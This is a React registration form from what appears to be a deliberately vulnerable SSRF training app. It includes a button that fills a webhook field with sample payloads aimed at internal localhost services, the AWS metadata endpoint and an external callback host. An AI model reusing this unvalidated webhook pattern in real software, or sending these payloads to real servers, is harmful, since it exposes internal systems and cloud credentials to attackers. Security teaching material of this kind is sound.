import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { authAPI } from '../services/api';

function Register({ setUser }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');
  const [webhookUrl, setWebhookUrl] = useState('');
  const [showSSRFDemo, setShowSSRFDemo] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    try {
      const registerData = { 
        username, 
        password, 
        email, 
        role: 'USER'
      };
      
      // SSRF: Add webhook URL if provided
      if (webhookUrl) {
        registerData.webhookUrl = webhookUrl;
      }
      
      const response = await authAPI.register(registerData);
      const { token, username: user, role } = response.data;
      
      localStorage.setItem('token', token);
      localStorage.setItem('username', user);
      localStorage.setItem('role', role);
      
      setUser({ token, username: user, role });
      navigate('/');
    } catch (err) {
      setError('Registration failed. Username or email may already exist.');
    }
  };

  const exploitSSRF = () => {
    // Demo SSRF payloads
    const payloads = [
      'http://localhost:8081/api/users',          // Internal user service
      'http://localhost:8082/admin/products/',    // Internal admin panel
      'http://localhost:5433',                    // PostgreSQL user DB
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://192.168.1.1:8080',                  // Internal network scan
      'http://burp-collaborator.example.com'      // External callback
    ];
    
    const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
    setWebhookUrl(randomPayload);
    setShowSSRFDemo(true);
  };

  return (
    <div className="form-container">
      <h2>Register</h2>
      {error && <div className="alert alert-error">{error}</div>}
      
      {/* SSRF Demo Section */}
      <div className="ssrf-demo">
        <button 
          type="button" 
          onClick={() => setShowSSRFDemo(!showSSRFDemo)}
          className="btn btn-warning"
        >
          🔓 SSRF Demo: Webhook Attack
        </button>
        {showSSRFDemo && (
          <div className="demo-panel">
            <p><strong>SSRF Attack Scenario:</strong> Webhook callback sau khi đăng ký user</p>
            <p>User-service sẽ gửi POST request đến webhook URL với user data</p>
            <button onClick={exploitSSRF} className="btn btn-danger">
              Generate Random SSRF Payload
            </button>
          </div>
        )}
      </div>

      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label>Username:</label>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
        </div>
        <div className="form-group">
          <label>Email:</label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
        </div>
        <div className="form-group">
          <label>Password:</label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        
        {/* SSRF Input */}
        {showSSRFDemo && (
          <div className="form-group ssrf-input">
            <label>🎯 Webhook URL (SSRF):</label>
            <input
              type="text"
              value={webhookUrl}
              onChange={(e) => setWebhookUrl(e.target.value)}
              placeholder="http://internal-service:8080/callback"
            />
            <small>⚠️ Server sẽ gửi POST request đến URL này sau khi tạo user</small>
          </div>
        )}
        
        <button type="submit" className="btn btn-primary">Register</button>
      </form>
    </div>
  );
}

export default Register;
